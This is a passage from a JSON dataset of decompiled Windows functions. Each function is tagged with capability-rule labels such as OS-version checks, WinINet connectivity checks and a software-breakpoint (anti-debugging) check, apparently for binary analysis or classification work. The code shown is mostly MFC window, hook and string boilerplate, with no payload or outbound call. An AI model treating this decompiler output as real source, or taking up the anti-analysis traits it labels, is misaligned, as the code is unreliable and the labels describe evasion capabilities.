        "decompiled_code": "\nuint fcn.00411e00(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint unaff_ESI;\n    \n    if (param_2 == 1) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"KERNEL32.DLL\");\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"DisableThreadLibraryCalls\");\n        if (pcVar2 != NULL) {\n            (*pcVar2)(unaff_ESI);\n        }\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x4319c0);\n        *0x4319f8 = unaff_ESI;\n        *0x4319fc = unaff_ESI;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        pcVar2 = _sym.imp.USER32.dll_GetSystemMetrics;\n        *0x431a00 = CONCAT11(uVar3, uVar3 >> 8);\n        if (((uVar3 & 0x80000000) == 0) || (*0x431a02 = 0x10,  0x35e < *0x431a00)) {\n            *0x431a02 = 0x20;\n        }\n        *0x4324d4 = (*_sym.imp.USER32.dll_GetSystemMetrics)(7);\n        *0x4324d4 = *0x4324d4 + -1;\n        *0x4324d8 = (*pcVar2)(8);\n        *0x4324d8 = *0x4324d8 + -1;\n        *0x4324dc = (*pcVar2)(4);\n        *0x4324e0 = (*pcVar2)(0x1e);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4319c0);\n    }\n    return 1;\n}\n",
        "token_count": 433
    },
    "00412be4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00412be4(code **param_1)\n\n{\n    *param_1 = vtable.exception.0;\n    if (param_1[2] != NULL) {\n        fcn.00415cc6(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00414108": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00414108(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) != 0) {\n        fcn.00415cc6(*(param_1 + 4));\n        *(param_1 + 4) = 0;\n    }\n    if (param_3 != 0) {\n        uVar1 = fcn.00415c9d(param_2 << 2);\n        *(param_1 + 4) = uVar1;\n        fcn.004079b0(uVar1, 0, param_2 << 2);\n    }\n    *(param_1 + 8) = param_2;\n    return;\n}\n",
        "token_count": 173
    },
    "004141a1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004141a1(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar2 = fcn.0041408f(param_1 + 0x14, *(param_1 + 0x18), 0xc);\n        iVar4 = *(param_1 + 0x18);\n        puVar3 = iVar2 + -8 + iVar4 * 0xc;\n        if (-1 < iVar4 + -1) {\n            do {\n                *puVar3 = *(param_1 + 0x10);\n                *(param_1 + 0x10) = puVar3;\n                puVar3 = puVar3 + -3;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n    }\n    puVar3 = *(param_1 + 0x10);\n    uVar1 = *puVar3;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    *(param_1 + 0x10) = uVar1;\n    puVar3[1] = 0;\n    puVar3[2] = 0;\n    return;\n}\n",
        "token_count": 304
    },
    "004144b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004144b0(uint lpString2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GlobalLock;\n    if (*(in_ECX + 0x98) != 0) {\n        var_4h = in_ECX;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(in_ECX + 0x98));\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*(iVar2 + 2) + iVar2, lpString2);\n        if (iVar2 == 0) {\n            iVar2 = sub.WINSPOOL.DRV_OpenPrinterA(lpString2, &var_4h, 0);\n            if (iVar2 != 0) {\n                if (*(in_ECX + 0x94) != 0) {\n                    fcn.00419abb(*(in_ECX + 0x94));\n                }\n                uVar3 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, 0, 0, 0);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x42, uVar3);\n                *(in_ECX + 0x94) = uVar3;\n                uVar3 = (*pcVar1)(uVar3);\n                iVar2 = sub.WINSPOOL.DRV_DocumentPropertiesA(0, var_4h, lpString2, uVar3, 0, 2);\n                if (iVar2 != 1) {\n                    fcn.00419abb(*(in_ECX + 0x94));\n                    *(in_ECX + 0x94) = 0;\n                }\n                sub.WINSPOOL.DRV_ClosePrinter(var_4h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 429
    },
    "00414572": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00414572(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.0041ab50();\n    if (*(iVar1 + 0x14) == '\\0') {\n        iVar1 = fcn.0041a923();\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        uVar2 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(0xffffffff, 0x4148ca, 0, uVar2);\n        *(iVar1 + 0x30) = uVar2;\n        iVar1 = fcn.0041b3e4(0x41a572);\n        if (*(iVar1 + 0x14) != 0) {\n            iVar3 = fcn.0041ab50();\n            (**(iVar1 + 0x14))(*(iVar3 + 8));\n        }\n        fcn.0041b34f(0x41a587);\n    }\n    return;\n}\n",
        "token_count": 229
    },
    "00414c5e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00414c5e(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *in_ECX;\n    uint32_t arg_ch_00;\n    int32_t *piVar5;\n    \n    if (arg_ch == 0xfffffffe) {\n        iVar1 = fcn.0041ab50();\n        iVar1 = (**(**(iVar1 + 0x1038) + 4))();\n        return iVar1;\n    }\n    if (arg_ch == 0xfffffffd) {\n        arg_ch = 0;\n        iVar1 = *(arg_10h + 0x30);\n        puVar2 = (**(*in_ECX + 0x2c))();\n        do {\n            if (puVar2 == NULL) {\n                return arg_ch;\n            }\n            if (arg_ch != 0) {\n                return arg_ch;\n            }\n            piVar5 = puVar2[1];\n            while (((piVar5[1] != 0 && (piVar5[2] != 0)) && (arg_ch == 0))) {\n                if (arg_8h == piVar5[1]) {\n                    if (iVar1 == 0) {\n                        iVar3 = *piVar5;\n                    }\n                    else {\n                        if (*piVar5 == 0) goto code_r0x00414d01;\n                        iVar3 = fcn.00407a10(iVar1, *piVar5, 0x10);\n                    }\n                    if (iVar3 == 0) {\n                        arg_ch = 1;\n                        *(arg_10h + 4) = piVar5[2];\n                    }\n                }\ncode_r0x00414d01:\n                piVar5 = piVar5 + 3;\n            }\n            puVar2 = *puVar2;\n        } while( true );\n    }\n    if (arg_ch != 0xffffffff) {\n        uVar4 = arg_ch & 0xffff;\n        arg_ch_00 = arg_ch >> 0x10;\n        arg_ch = uVar4;\n        if (arg_ch_00 != 0) goto code_r0x00414d26;\n    }\n    arg_ch_00 = 0x111;\ncode_r0x00414d26:\n    puVar2 = (**(*in_ECX + 0x28))();\n    while( true ) {\n        if (puVar2 == NULL) {\n            return 0;\n        }\n        iVar1 = fcn.00416e88(puVar2[1], arg_ch_00, arg_ch, arg_8h);\n        if (iVar1 != 0) break;\n        puVar2 = *puVar2;\n    }\n    iVar1 = fcn.00414b57(in_ECX, arg_8h, arg_ch, *(iVar1 + 0x14), arg_10h, *(iVar1 + 0x10), arg_14h);\n    return iVar1;\n}\n",
        "token_count": 689
    },
    "00415143": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00415143(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CDialog.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[7] != NULL) {\n        fcn.004169ad();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004167ef();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 193
    },
    "0041585f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0041585f(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *param_2;\n    if (*(iVar1 + -0xc) < 0) {\n        *param_1 = *0x42c8a8;\n        fcn.00415bc5(*param_2);\n    }\n    else {\n        *param_1 = iVar1;\n        (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(iVar1 + -0xc);\n    }\n    return param_1;\n}\n",
        "token_count": 135
    },
    "00415a75": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415a75(int32_t *param_1)\n\n{\n    int32_t arg_ch;\n    \n    arg_ch = *param_1;\n    if (1 < *(arg_ch + -0xc)) {\n        fcn.00415a21();\n        fcn.00415957(*(arg_ch + -8));\n        fcn.00407b70(*param_1, arg_ch, *(arg_ch + -8) + 1);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00415aa3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00415aa3(int32_t *param_1, int32_t param_2)\n\n{\n    if ((1 < *(*param_1 + -0xc)) || (*(*param_1 + -4) < param_2)) {\n        fcn.00415a21();\n        fcn.00415957(param_2);\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00415b75": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00415b75(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *param_1;\n    iVar2 = *param_2;\n    if (iVar1 != iVar2) {\n        if (((*(iVar1 + -0xc) < 0) && (iVar1 + -0xc != *0x42c8ac)) || (*(iVar2 + -0xc) < 0)) {\n            fcn.00415b48(*(iVar2 + -8), iVar2);\n        }\n        else {\n            fcn.00415a21();\n            iVar1 = *param_2;\n            *param_1 = iVar1;\n            (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(iVar1 + -0xc);\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 202
    },
    "00415bec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.00415bec(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t arg_ch;\n    int32_t iVar1;\n    \n    arg_ch = *param_1;\n    if ((1 < *(arg_ch + -0xc)) || (*(arg_ch + -4) < param_2)) {\n        iVar1 = *(arg_ch + -8);\n        if (param_2 < iVar1) {\n            param_2 = iVar1;\n        }\n        fcn.00415957(param_2);\n        fcn.00407b70(*param_1, arg_ch, iVar1 + 1);\n        *(*param_1 + -8) = iVar1;\n        fcn.00415a52(arg_ch + -0xc);\n    }\n    return *param_1;\n}\n",
        "token_count": 183
    },
    "00415fbc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n\nuint fcn.00415fbc(void)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h_2;\n    uint var_14h_2;\n    uint var_18h;\n    uint var_10h;\n    uint var_40h;\n    uint var_24h;\n    uint var_14h;\n    uint var_ch_2;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = &stack0xffffffc0;\n    iVar1 = fcn.0041b34f(0x41a53e);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x14) = iVar1;\n    puVar4 = iVar1 + 0x34;\n    puVar5 = unaff_EBP + -0x40;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    iVar3 = *(unaff_EBP + 0x10);\n    arg_8h = *(unaff_EBP + 8);\n    *(iVar1 + 0x34) = *(unaff_EBP + 0xc);\n    *(iVar1 + 0x3c) = *(unaff_EBP + 0x14);\n    uVar2 = *(unaff_EBP + 0x18);\n    *(iVar1 + 0x38) = iVar3;\n    *(iVar1 + 0x40) = uVar2;\n    if ((iVar3 == 2) && (arg_8h[0xd] != NULL)) {\n        (**(*arg_8h[0xd] + 0x5c))(0);\n    }\n    *(unaff_EBP + 8) = 0;\n    if (iVar3 == 0x110) {\n        fcn.00415e49(arg_8h, unaff_EBP + -0x24, unaff_EBP + 8);\n    }\n    uVar2 = (**(*arg_8h + 0x98))(iVar3, *(unaff_EBP + 0x14), *(unaff_EBP + 0x18));\n    *(unaff_EBP + 0x18) = uVar2;\n    if (iVar3 == 0x110) {\n        fcn.00415e6c(arg_8h, unaff_EBP + -0x24);\n    }\n    uVar2 = *(unaff_EBP + 0x18);\n    puVar4 = unaff_EBP + -0x40;\n    puVar5 = iVar1 + 0x34;\n    for (iVar3 = 7; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 786
    },
    "0041610b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0041610b(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    iVar1 = fcn.0041ab76();\n    if ((*(iVar1 + 0x14) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.00415c8b(0x419af1);\n        iVar3 = fcn.00415c9d(0x48);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00418d0a(0x41dc88, 0x1c, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x14) = uVar4;\n        fcn.00415c8b(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x14);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 356
    },
    "00416439": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00416439(int32_t arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    uint32_t var_10h;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.0041b34f(0x41a53e);\n    if (arg_8h != 3) {\n        uVar2 = (*_sym.imp.USER32.dll_CallNextHookEx)(*(var_4h + 0x2c), arg_8h, arg_ch, arg_10h);\n        return uVar2;\n    }\n    piVar1 = *(var_4h + 0x14);\n    iVar6 = *arg_10h;\n    iVar3 = fcn.0041ab50();\n    var_8h = *(iVar3 + 0x14);\n    if ((piVar1 == NULL) && (((*(iVar6 + 0x23) & 0x40) != 0 || (var_8h != 0)))) goto code_r0x00416602;\n    if (*0x42fdf4 != 0) {\n        uVar4 = (*_sym.imp.USER32.dll_GetClassLongA)(arg_ch, 0xffffffe6);\n        if ((uVar4 & 0x10000) != 0) goto code_r0x00416602;\n        puVar5 = *(iVar6 + 0x28);\n        if (puVar5 >> 0x10 == 0) {\n            var_10h = var_10h & 0xffffff00 | var_10h & puVar5 >> 0x10;\n            (*_sym.imp.KERNEL32.dll_GlobalGetAtomNameA)(&var_10h & 0xffff0000 | *(iVar6 + 0x28), &var_10h, 5);\n            puVar5 = &var_10h;\n        }\n        iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(puVar5, 0x41e138);\n        if (iVar6 == 0) goto code_r0x00416602;\n    }\n    if (piVar1 == NULL) {\n        iVar6 = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_ch, 0xfffffffc);\n        pcVar9 = _sym.imp.USER32.dll_GetPropA;\n        if ((iVar6 != 0) && (iVar3 = (*_sym.imp.USER32.dll_GetPropA)(arg_ch, \"AfxOldWndProc423\"),  iVar3 == 0)) {\n            (*_sym.imp.USER32.dll_SetPropA)(arg_ch, \"AfxOldWndProc423\", iVar6);\n            iVar3 = (*pcVar9)(arg_ch, \"AfxOldWndProc423\");\n            if (iVar3 == iVar6) {\n                (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(\"AfxOldWndProc423\");\n                pcVar9 = fcn.004163bd;\n                if (*(var_4h + 0x28) == 0) {\n                    pcVar9 = fcn.0041625e;\n                }\n                (*_sym.imp.USER32.dll_SetWindowLongA)(arg_ch, 0xfffffffc, pcVar9);\n            }\n        }\n        goto code_r0x00416602;\n    }\n    fcn.004161c2(arg_ch);\n    (**(*piVar1 + 0x50))();\n    piVar7 = (**(*piVar1 + 0x80))();\n    iVar6 = *0x42fdf0;\n    if ((((*0x42fddc == 0) && (var_8h == 0)) && (*0x42fdf0 != 0)) &&\n       ((*(*0x42fdf0 + 0x20) != 0 && (var_10h = fcn.00415fbc(piVar1, arg_ch, 0x36f, 0, 0),  var_10h != 0)))) {\n        iVar3 = fcn.00416258();\n        iVar8 = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_ch, 0xfffffffc);\n        (**(iVar6 + 0x20))(arg_ch, var_10h);\n        if (iVar8 != iVar3) {\n            iVar3 = (*_sym.imp.USER32.dll_SetWindowLongA)(arg_ch, 0xfffffffc, iVar3);\ncode_r0x00416596:\n            *piVar7 = iVar3;\n        }\n    }\n    else {\n        iVar6 = fcn.00416258();\n        iVar3 = (*_sym.imp.USER32.dll_SetWindowLongA)(arg_ch, 0xfffffffc, iVar6);\n        if (iVar3 != iVar6) goto code_r0x00416596;\n    }\n    *(var_4h + 0x14) = 0;\ncode_r0x00416602:\n    iVar6 = var_4h;\n    uVar2 = (*_sym.imp.USER32.dll_CallNextHookEx)(*(var_4h + 0x2c), 3, arg_ch, arg_10h);\n    if (var_8h != 0) {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar6 + 0x2c));\n        *(iVar6 + 0x2c) = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 1263
    },
    "0041662f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041662f(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    iVar1 = fcn.0041b34f(0x41a53e);\n    if (*(iVar1 + 0x14) != unaff_retaddr) {\n        if (*(iVar1 + 0x2c) == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            iVar3 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(5, fcn.00416439, 0, uVar2);\n            *(iVar1 + 0x2c) = iVar3;\n            if (iVar3 == 0) {\n                fcn.00414000();\n            }\n        }\n        *(iVar1 + 0x14) = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "0041667b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041667b(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.0041b34f(0x41a53e);\n    iVar2 = fcn.0041ab50();\n    if ((*(iVar2 + 0x14) != '\\0') && (*(iVar1 + 0x2c) != 0)) {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar1 + 0x2c));\n        *(iVar1 + 0x2c) = 0;\n    }\n    if (*(iVar1 + 0x14) != 0) {\n        *(iVar1 + 0x14) = 0;\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 175
    },
    "004167ef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004167ef(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWnd.0;\n    *(unaff_EBP + -4) = 0;\n    if ((((extraout_ECX[7] != NULL) && (extraout_ECX != 0x42f7f0)) && (extraout_ECX != 0x42f7b0)) &&\n       ((extraout_ECX != 0x42f770 && (extraout_ECX != 0x42f730)))) {\n        fcn.004169ad();\n    }\n    if (extraout_ECX[0xd] != NULL) {\n        (**(*extraout_ECX[0xd] + 4))(1);\n    }\n    pcVar1 = extraout_ECX[0xe];\n    if ((pcVar1 != NULL) && (*(pcVar1 + 0x24) == extraout_ECX)) {\n        *(pcVar1 + 0x24) = 0;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00414b2c();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 353
    },
    "00416889": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00416889(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    \n    iVar2 = fcn.0041455d();\n    if (iVar2 == 0) goto code_r0x004168d4;\n    if (*(iVar2 + 0x1c) == param_1) {\n        iVar3 = fcn.0041ab50();\n        if (*(iVar3 + 0x14) == '\\0') {\n            iVar3 = fcn.0041ab50();\n            if (iVar2 == *(iVar3 + 4)) {\n                iVar3 = fcn.0041a0c0();\n                if (iVar3 == 0) goto code_r0x004168c9;\n            }\n            fcn.0041bb25(0);\n        }\ncode_r0x004168c9:\n        *(iVar2 + 0x1c) = 0;\n    }\n    if (*(iVar2 + 0x20) == param_1) {\n        *(iVar2 + 0x20) = 0;\n    }\ncode_r0x004168d4:\n    if (param_1[0xc] != NULL) {\n        (**(*param_1[0xc] + 0x50))();\n        param_1[0xc] = 0;\n    }\n    if (param_1[0xd] != NULL) {\n        (**(*param_1[0xd] + 4))(1);\n    }\n    param_1[0xd] = 0;\n    if ((*(param_1 + 9) & 1) != 0) {\n        iVar2 = fcn.0041a923();\n        iVar2 = *(iVar2 + 0xcc);\n        if ((iVar2 != 0) && (*(iVar2 + 0x1c) != 0)) {\n            fcn.004079b0(&var_2ch, 0, 0x2c);\n            var_24h = param_1[7];\n            var_2ch = 0x28;\n            var_28h = 1;\n            var_20h = var_24h;\n            (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x1c), 0x405, 0, &var_2ch);\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    iVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1[7], 0xfffffffc);\n    fcn.004160e4();\n    iVar3 = (*pcVar1)(param_1[7], 0xfffffffc);\n    if (iVar3 == iVar2) {\n        piVar4 = (**(*param_1 + 0x80))();\n        if (*piVar4 != 0) {\n            (*_sym.imp.USER32.dll_SetWindowLongA)(param_1[7], 0xfffffffc, *piVar4);\n        }\n    }\n    fcn.004161fb();\n    (**(*param_1 + 0xa4))();\n    return;\n}\n",
        "token_count": 733
    },
    "004169ad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004169ad(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x1c) == 0) {\n        return 0;\n    }\n    fcn.0041610b(0);\n    iVar1 = fcn.00414239(*(param_1 + 0x1c));\n    if (*(param_1 + 0x38) == NULL) {\n        uVar2 = (*_sym.imp.USER32.dll_DestroyWindow)(*(param_1 + 0x1c));\n    }\n    else {\n        uVar2 = (**(**(param_1 + 0x38) + 0x50))();\n    }\n    if (iVar1 == 0) {\n        fcn.004161fb();\n    }\n    return uVar2;\n}\n",
        "token_count": 189
    },
    "00416e88": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
